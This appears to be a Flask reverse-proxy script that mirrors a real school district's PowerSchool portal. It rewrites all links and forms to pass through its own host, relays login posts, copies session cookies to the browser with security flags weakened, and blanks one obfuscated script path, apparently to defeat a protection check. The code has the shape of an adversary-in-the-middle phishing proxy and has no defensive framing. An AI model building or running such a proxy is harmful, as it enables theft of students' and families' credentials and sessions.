from flask import Flask, request, redirect, url_for, Response
import requests
import re

app = Flask(__name__)

BASE_URL = "https://beaufortsc.powerschool.com"
session = requests.Session()

def replace_urls(html_content):
    pattern = r'(href|src|action)="(/[^"]*)"'
    html_content = re.sub(pattern, r'\1="/proxy\2"', html_content)
    pattern_single = r"(href|src|action)='(/[^']*)'"
    html_content = re.sub(pattern_single, r"\1='/proxy\2'", html_content)
    return html_content

def copy_cookies_to_response(resp, r):
    for cookie in r.cookies:
        resp.set_cookie(
            cookie.name,
            cookie.value,
            expires=cookie.expires,
            path='/',
            secure=False,
            httponly=cookie.has_nonstandard_attr('HttpOnly'),
            samesite='Lax'
        )

def sync_browser_cookies():
    session.cookies.clear()
    for k, v in request.cookies.items():
        session.cookies.set(k, v)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        return redirect(url_for('home'))

    sync_browser_cookies()
    response = session.get(f"{BASE_URL}/public/home.html", allow_redirects=True)
    html_content = replace_urls(response.text)
    resp = Response(html_content, content_type='text/html')
    copy_cookies_to_response(resp, response)
    return resp

@app.route('/proxy/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    sync_browser_cookies()
    url = f"{BASE_URL}/{path}"
    if request.query_string:
        url = f"{url}?{request.query_string.decode('utf-8', errors='ignore')}"

    headers = {k: v for k, v in request.headers.items()}
    headers['Host'] = 'beaufortsc.powerschool.com'
    headers['Referer'] = f"{BASE_URL}/{path}"
    headers.pop('Content-Length', None)
    headers.pop('Cookie', None)

    if request.method == 'POST':
        response = session.request('POST', url, data=request.form or request.get_data(), files=request.files or None, headers=headers, allow_redirects=False)
    else:
        response = session.request('GET', url, headers=headers, allow_redirects=False)

    content = response.content
    content_type = response.headers.get('content-type', '').lower()

    if 'text/html' in content_type:
        html_content = replace_urls(content.decode('utf-8', errors='replace'))
        content = html_content.encode('utf-8')
    elif 'javascript' in content_type:
        js_content = content.decode('utf-8', errors='replace').replace(BASE_URL, f"{request.host_url}proxy")
        content = js_content.encode('utf-8')

    resp = Response(content, content_type=response.headers.get('content-type', 'text/plain'))
    copy_cookies_to_response(resp, response)

    if 'location' in response.headers:
        location = response.headers['location']
        if location.startswith(BASE_URL):
            location = location[len(BASE_URL):]
        if location.startswith('/'):
            resp.headers['location'] = f'/proxy{location}'

    return resp

@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
def catch_all(path):
    if path == "eade-to-the-call-make-to-looken-the-good-What-ge":
        return Response("", content_type="application/javascript")

    sync_browser_cookies()
    url = f"{BASE_URL}/{path}"
    if request.query_string:
        url = f"{url}?{request.query_string.decode('utf-8', errors='ignore')}"

    headers = {k: v for k, v in request.headers.items()}
    headers['Host'] = 'beaufortsc.powerschool.com'
    headers['Referer'] = f"{BASE_URL}/{path}"
    headers.pop('Content-Length', None)
    headers.pop('Cookie', None)

    if request.method == 'POST':
        if request.files:
            response = session.request('POST', url, data=request.form or None, files=request.files or None, headers=headers, allow_redirects=False)
        else:
            response = session.request('POST', url, data=request.get_data(), headers=headers, allow_redirects=False)
    else:
        response = session.request('GET', url, headers=headers, allow_redirects=False)

    content = response.content
    content_type = response.headers.get('content-type', '').lower()

    if 'text/html' in content_type:
        html_content = replace_urls(content.decode('utf-8', errors='replace'))
        content = html_content.encode('utf-8')
    elif 'javascript' in content_type:
        js_content = content.decode('utf-8', errors='replace').replace(BASE_URL, f"{request.host_url}proxy")
        content = js_content.encode('utf-8')

    resp = Response(content, content_type=response.headers.get('content-type', 'text/plain'))
    copy_cookies_to_response(resp, response)

    if 'location' in response.headers:
        location = response.headers['location']
        if location.startswith(BASE_URL):
            location = location[len(BASE_URL):]
        if location.startswith('/'):
            resp.headers['location'] = f'/proxy{location}'

    return resp

if __name__ == '__main__':
    app.run(debug=True, threaded=True)
